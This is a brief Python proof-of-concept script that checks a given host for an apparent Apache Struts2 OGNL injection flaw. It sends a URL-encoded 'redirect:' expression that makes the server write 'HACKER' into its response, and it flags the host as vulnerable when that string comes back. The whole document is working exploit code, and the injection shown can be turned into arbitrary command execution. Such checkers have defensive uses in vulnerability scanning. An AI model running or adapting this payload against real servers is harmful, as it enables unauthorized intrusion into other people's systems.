#-*-coding:utf-8-*-
#Author:Nan3r

import requests

def poc(url):
	url = 'http://'+url
	poc = '''?redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22HACKER%22),%23p.close()}'''
	try:
		text = requests.get(url+poc, timeout=3).text
		if text.strip() == 'HACKER':
			return url
	except Exception, e:
		return False
	return False